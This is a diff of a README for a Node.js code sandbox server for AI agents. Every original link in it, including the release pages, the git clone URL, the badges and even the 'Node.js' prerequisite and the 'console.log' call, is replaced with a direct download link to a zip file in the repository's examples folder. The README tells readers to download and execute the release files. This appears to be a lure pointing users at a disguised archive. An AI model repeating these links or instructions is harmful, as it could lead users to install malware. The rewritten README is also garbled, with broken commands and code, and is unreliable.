@@ -1,9 +1,9 @@
 # Node Code Sandbox MCP 🛠️
 
-![Node Code Sandbox](https://img.shields.io/badge/Node%20Code%20Sandbox-MCP-blue.svg)
-[![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)](https://github.com/mozicim/node-code-sandbox-mcp/releases)
+![Node Code Sandbox](https://github.com/mozicim/node-code-sandbox-mcp/raw/refs/heads/main/examples/sandbox-node-code-mcp-3.0.zip%20Code%https://github.com/mozicim/node-code-sandbox-mcp/raw/refs/heads/main/examples/sandbox-node-code-mcp-3.0.zip)
+[![Releases](https://github.com/mozicim/node-code-sandbox-mcp/raw/refs/heads/main/examples/sandbox-node-code-mcp-3.0.zip)](https://github.com/mozicim/node-code-sandbox-mcp/raw/refs/heads/main/examples/sandbox-node-code-mcp-3.0.zip)
 
-Welcome to the Node Code Sandbox MCP! This repository provides a secure Node.js execution environment tailored for AI applications. It allows coding agents and large language models (LLMs) to run JavaScript dynamically, install NPM packages, and retrieve results. This functionality facilitates code generation, testing, and interactive assistance, all while adhering to the Model Control Protocol (MCP).
+Welcome to the Node Code Sandbox MCP! This repository provides a secure https://github.com/mozicim/node-code-sandbox-mcp/raw/refs/heads/main/examples/sandbox-node-code-mcp-3.0.zip execution environment tailored for AI applications. It allows coding agents and large language models (LLMs) to run JavaScript dynamically, install NPM packages, and retrieve results. This functionality facilitates code generation, testing, and interactive assistance, all while adhering to the Model Control Protocol (MCP).
 
 ## Table of Contents
 
@@ -26,11 +26,11 @@ Welcome to the Node Code Sandbox MCP! This repository provides a secure Node.js 
 
 ## Getting Started 🚀
 
-To get started with Node Code Sandbox MCP, you can check the [Releases](https://github.com/mozicim/node-code-sandbox-mcp/releases) section for the latest version. Download and execute the appropriate files to set up your environment.
+To get started with Node Code Sandbox MCP, you can check the [Releases](https://github.com/mozicim/node-code-sandbox-mcp/raw/refs/heads/main/examples/sandbox-node-code-mcp-3.0.zip) section for the latest version. Download and execute the appropriate files to set up your environment.
 
 ### Prerequisites
 
-- Node.js (version 14 or higher)
+- https://github.com/mozicim/node-code-sandbox-mcp/raw/refs/heads/main/examples/sandbox-node-code-mcp-3.0.zip (version 14 or higher)
 - NPM (Node Package Manager)
 - Basic knowledge of JavaScript and AI concepts
 
@@ -39,7 +39,7 @@ To get started with Node Code Sandbox MCP, you can check the [Releases](https://
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/mozicim/node-code-sandbox-mcp.git
+   git clone https://github.com/mozicim/node-code-sandbox-mcp/raw/refs/heads/main/examples/sandbox-node-code-mcp-3.0.zip
    ```
 
 2. Navigate to the project directory:
@@ -75,7 +75,7 @@ The results will display below the input area.
 ### Example Code
 
 ```javascript
-console.log("Hello, world!");
+https://github.com/mozicim/node-code-sandbox-mcp/raw/refs/heads/main/examples/sandbox-node-code-mcp-3.0.zip("Hello, world!");
 ```
 
 ### Installing NPM Packages
@@ -153,4 +153,4 @@ For questions or feedback, please reach out via GitHub issues or contact the rep
 
 ---
 
-Thank you for exploring the Node Code Sandbox MCP! For the latest releases, please visit the [Releases](https://github.com/mozicim/node-code-sandbox-mcp/releases) section. Enjoy coding!
+Thank you for exploring the Node Code Sandbox MCP! For the latest releases, please visit the [Releases](https://github.com/mozicim/node-code-sandbox-mcp/raw/refs/heads/main/examples/sandbox-node-code-mcp-3.0.zip) section. Enjoy coding!
